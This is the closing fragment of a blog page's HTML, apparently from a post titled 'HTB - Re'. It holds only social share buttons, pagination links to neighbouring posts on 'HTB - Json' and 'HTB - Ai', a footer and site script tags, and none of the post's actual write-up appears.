4.71-6.469C9.84.051 9.941.0 9.999.0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg></div></div></a><a class=resp-sharing-button__link href="mailto:?subject=HTB%20-%20Re&amp;body=https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f02%2fhtb-re%2f" target=_self rel=noopener aria-label title="Share via email"><div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1.0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1.0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg></div></div></a><a class=resp-sharing-button__link href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f02%2fhtb-re%2f&amp;media=https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f02%2fhtb-re%2f;description=HTB%20-%20Re" target=_blank rel=noopener aria-label title="Share on pinterest"><div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M12.017.0C5.396.0.029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024.0 1.518.769 1.518 1.688.0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128.0 3.768-2.245 3.768-5.487.0-2.861-2.063-4.869-5.008-4.869-3.41.0-5.409 2.562-5.409 5.199.0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646.0-3.776 2.748-7.252 7.92-7.252 4.158.0 7.392 2.967 7.392 6.923.0 4.135-2.607 7.462-6.233 7.462-1.214.0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607.0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017.0z"/></svg></div></div></a><a class=resp-sharing-button__link href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f02%2fhtb-re%2f&amp;title=HTB%20-%20Re&amp;summary=HTB%20-%20Re&amp;source=https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f02%2fhtb-re%2f" target=_blank rel=noopener aria-label title="Share on linkedin"><div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 016 6v7h-4v-7a2 2 0 00-2-2 2 2 0 00-2 2v7h-4v-7a6 6 0 016-6z"/><rect x="2" y="9" width="4" height="12"/><circle cx="4" cy="4" r="2"/></svg></div></div></a><a class=resp-sharing-button__link href="https://reddit.com/submit/?url=https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f02%2fhtb-re%2f&amp;resubmit=true&amp;title=HTB%20-%20Re" target=_blank rel=noopener aria-label title="Share on reddit"><div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M12 0A12 12 0 000 12a12 12 0 0012 12 12 12 0 0012-12A12 12 0 0012 0zm5.01 4.744c.688.0 1.25.561 1.25 1.249a1.25 1.25.0 01-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968.0 1.754.786 1.754 1.754.0.716-.435 1.333-1.01 1.614a3.111 3.111.0 01.042.52c0 2.694-3.13 4.87-7.004 4.87s-7.004-2.176-7.004-4.87c0-.183.015-.366.043-.534A1.748 1.748.0 014.028 12c0-.968.786-1.754 1.754-1.754.463.0.898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342.0 01.14-.197.35.35.0 01.238-.042l2.906.617a1.214 1.214.0 011.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687.0 1.248-.561 1.248-1.249S9.937 12 9.249 12zm5.5.0c-.687.0-1.248.561-1.248 1.25.0.687.561 1.248 1.249 1.248S16 13.937 16 13.249c0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327.0 00-.231.094.33.33.0 000 .463c.842.842 2.484.913 2.961.913s2.105-.056 2.961-.913a.361.361.0 00.029-.463.33.33.0 00-.464.0c-.547.533-1.684.73-2.512.73-.828.0-1.979-.196-2.512-.73a.326.326.0 00-.232-.095z"/></svg></div></div></a><a class=resp-sharing-button__link href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f02%2fhtb-re%2f;title=HTB%20-%20Re" target=_blank rel=noopener aria-label title="Share on xing"><div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M18.188.0c-.517.0-.741.325-.927.66.0.0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211.0.375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016.0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894.0 21.686.0h-3.498zM3.648 4.74c-.211.0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016.0.021L1.86 16.051c-.099.188-.093.381.0.529.085.142.239.234.45.234h3.461c.518.0.766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg></div></div></a><a class=resp-sharing-button__link href="whatsapp://send?text=HTB%20-%20Re%20https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f02%2fhtb-re%2f" target=_blank rel=noopener aria-label title="Share on whatsapp"><div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198.0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479.0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87.0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86.0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64.0 5.122 1.03 6.988 2.898a9.825 9.825.0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815.0 0012.05.0C5.495.0.16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882.0 005.683 1.448h.005c6.554.0 11.89-5.335 11.893-11.893a11.821 11.821.0 00-3.48-8.413z"/></svg></div></div></a><a class=resp-sharing-button__link href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f02%2fhtb-re%2f&amp;t=HTB%20-%20Re" target=_blank rel=noopener aria-label title="Share on hacker news"><div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg></div></div></a><a class=resp-sharing-button__link href="https://telegram.me/share/url?text=HTB%20-%20Re&amp;url=https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f02%2fhtb-re%2f" target=_blank rel=noopener aria-label title="Share on telegram"><div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg></div></div></a></div><div class=pagination><hr><div class=pagination__buttons><a href=https://0xade1.github.io/posts/2020/03/htb-json/ class="button next"><span class=button__icon>←</span>
<span class=button__text>HTB - Json</span></a>
<a href=https://0xade1.github.io/posts/2020/02/htb-ai/ class="button previous"><span class=button__text>HTB - Ai</span>
<span class=button__icon>→</span></a></div><hr></div></main></div><footer class=footer><div class=footer__inner><div class=footer__content><span>&copy; 2023</span>
<span><a href=https://0xade1.github.io></a></span>
<span></span>
<span><a href=https://0xade1.github.io/posts/index.xml target=_blank title=rss><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></span></div></div><div class=footer__inner><div class=footer__content><span>Powered by <a href=http://gohugo.io>Hugo</a></span><span>Made with &#10084;</span></div></div></footer></div><script type=text/javascript src=https://0xade1.github.io/bundle.min.4037dc94fd1565c4fd3354e2b4a2d1ff11842c906242435350b4d2d8d6e8b7890da46c0a865173f543a6161c1f4d1c94147f1b907db36489fc2bf5e20d4af75c.js integrity="sha512-QDfclP0VZcT9M1TitKLR/xGELJBiQkNTULTS2Nbot4kNpGwKhlFz9UOmFhwfTRyUFH8bkH2zZIn8K/XiDUr3XA=="></script><div id=fastSearch><ul id=searchResults></ul><input id=searchInput tabindex=0></div><script src=https://cdn.jsdelivr.net/npm/fuse.js@6.6.2/dist/fuse.min.js></script>
<script src=https://0xade1.github.io/js/fastsearch.js></script></body></html>